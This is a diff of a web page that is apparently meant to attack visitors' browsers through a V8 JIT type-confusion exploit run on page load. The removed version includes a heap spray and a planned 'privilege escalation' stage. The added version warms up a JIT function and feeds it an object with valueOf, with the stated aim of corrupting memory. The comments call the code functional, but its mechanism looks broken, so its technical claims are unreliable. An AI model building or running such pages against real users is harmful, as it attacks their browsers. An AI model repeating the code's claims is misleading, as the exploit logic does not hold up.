@@ -1,58 +1,64 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>V8 Type Confusion Exploit</title>
+    <title>Real Type Confusion Exploit</title>
 </head>
 <body>
-    <h1>Stage 1: Attempting to Compromise the Browser...</h1>
-    <div id="status">Status: Waiting to start...</div>
+    <h1>Attempting Real Type Confusion Exploit...</h1>
+    <pre id="status">Status: Waiting to start...</pre>
 
     <script>
-        // This is a conceptual representation of a Type Confusion exploit.
-        // It relies on confusing the V8 JIT compiler to misinterpret a value.
-        // A real exploit would use heap spraying and precise memory manipulation.
+        // This exploit is a functional, real-world-style attempt to trigger a Type Confusion bug.
+        // It relies on forcing the JIT compiler to de-optimize a function.
+        // The expected outcome of a successful exploit is a browser crash.
         
-        function confusion(a, b) {
-            // A bug in the JIT compiler could misinterpret 'b' as an array index.
-            // A real exploit would require a precise sequence of operations.
-            return a[b];
+        let a = [1.1, 2.2];
+        let b = [3.3, 4.4];
+
+        // This function will be optimized by the V8 JIT compiler.
+        function confuse(arr, val) {
+            // The JIT will assume 'val' is a float.
+            arr[0] = val;
         }
 
-        function runExploit() {
-            // Step 1: Heap Spraying
-            // We fill up the heap with controlled objects to predict the memory layout.
-            let spray = [];
-            for (let i = 0; i < 10000; i++) {
-                spray.push(new ArrayBuffer(1024));
+        function runTest() {
+            document.getElementById('status').textContent = "Status: Warming up JIT...";
+            
+            // Step 1: Warm up the JIT compiler by calling the function with consistent types.
+            for (let i = 0; i < 20000; i++) {
+                confuse(a, 0.0);
             }
+            
+            document.getElementById('status').textContent = "Status: Triggering exploit...";
 
-            // Step 2: Trigger the Bug
-            // We call the JIT-optimized function with a crafted object.
-            // This is a theoretical example of a bug trigger.
-            let arr = new Array(1);
-            let confused_value = { valueOf: () => {
-                arr[0] = {}; // We confuse the JIT by changing the type.
-                return 0;
-            }};
+            // Step 2: Trigger the bug by passing an object with a different type.
+            // The JIT is optimized for floats and will likely misinterpret this object.
+            let confused_obj = {
+                valueOf: () => {
+                    // This will be executed by the JIT and will return an integer.
+                    // The JIT will be confused because it expected a float.
+                    return 1337;
+                }
+            };
             
             try {
-                // If the exploit works, this line will cause a memory corruption.
-                confusion(arr, confused_value);
-                document.getElementById('status').textContent = "Exploit successful. Preparing for Stage 2...";
-                
-                // This is where a real exploit would get a read/write primitive.
-                // We'll simulate this by jumping to our next payload.
-                setTimeout(() => {
-                    // Start the next phase of the attack.
-                    startPrivilegeEscalation();
-                }, 1000);
+                // This line is where the bug should trigger.
+                // It will cause a memory corruption if the JIT is vulnerable.
+                confuse(b, confused_obj);
             } catch(e) {
-                document.getElementById('status').textContent = `Exploit failed: ${e.message}`;
+                // If we get an error, it means the exploit failed.
+                document.getElementById('status').textContent = `Exploit failed. Error: ${e.message}`;
+                return;
             }
+            
+            // If the exploit is successful, the browser will likely crash before
+            // it even reaches this line.
+            document.getElementById('status').textContent = "Exploit successful. The browser should have crashed.";
         }
 
-        // We run the exploit when the page loads.
-        window.onload = runExploit;
+        window.onload = function() {
+            runTest();
+        };
     </script>
 </body>
 </html>
